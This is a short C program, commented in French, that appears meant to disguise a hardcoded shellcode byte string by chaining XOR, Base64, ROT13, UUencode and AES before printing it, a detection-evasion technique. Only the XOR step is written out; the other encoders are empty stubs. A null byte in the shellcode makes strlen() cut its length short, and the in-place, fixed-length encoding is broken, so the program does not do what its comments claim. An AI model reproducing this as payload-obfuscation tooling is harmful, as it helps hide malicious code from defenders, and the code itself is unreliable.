#include <stdio.h>
#include <string.h>

// Fonction pour encoder un shellcode avec XOR
void xor_encode(char *data, char *key, int len) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % strlen(key)];
    }
}

// Fonction pour encoder un shellcode avec Base64
void base64_encode(char *data, int len) {
    // ...
}

// Fonction pour encoder un shellcode avec ROT13
void rot13_encode(char *data, int len) {
    // ...
}

// Fonction pour encoder un shellcode avec UUencode
void uuencode(char *data, int len) {
    // ...
}

// Fonction pour encoder un shellcode avec AES
void aes_encode(char *data, int len, char *key) {
    // ...
}

// Fonction pour combiner plusieurs encodages
void combine_encodings(char *shellcode, int len) {
    char key[] = "maClé";
    xor_encode(shellcode, key, len);
    base64_encode(shellcode, len);
    rot13_encode(shellcode, len);
    uuencode(shellcode, len);
    aes_encode(shellcode, len, key);
}

int main() {
    char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9a\xe8\x46\x0c\x00\x00\x53\x54\x5f\x52\x57\x59\x41\x50\x0f\x05";
    int len = strlen((char *)shellcode);

    combine_encodings(shellcode, len);

        printf("Shellcode encodé : ");
    for (int i = 0; i < len; i++) {
        printf("\\x%02x", shellcode[i]);
    }
    printf("\n");

    return 0;
}

